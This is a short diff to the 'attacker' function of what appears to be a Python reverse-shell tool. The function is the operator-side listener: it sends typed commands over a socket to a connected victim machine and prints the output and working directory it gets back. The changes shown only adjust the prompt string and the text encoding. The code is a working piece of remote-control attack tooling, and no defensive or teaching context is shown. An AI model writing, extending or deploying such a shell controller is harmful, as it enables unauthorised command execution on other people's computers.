@@ -20,16 +20,16 @@ def attacker(listen_ip, listen_port):
     print("[+] Current working directory:", cwd)
 
     while True:
-        command = input(f"{cwd} $> ")
+        command = input(f"{cwd}> ")
         if not command.strip():
             # empty command
             continue
         # send the command to the client
-        client_socket.send(command.encode())
+        client_socket.send(command.encode("utf-8"))
         if command.lower() == "exit":
             break
         # retrieve command result
-        output = client_socket.recv(BUFFER_SIZE).decode()
+        output = client_socket.recv(BUFFER_SIZE).decode("utf-8")
         results, cwd = output.split(SEPARATOR)
         print(results)
     
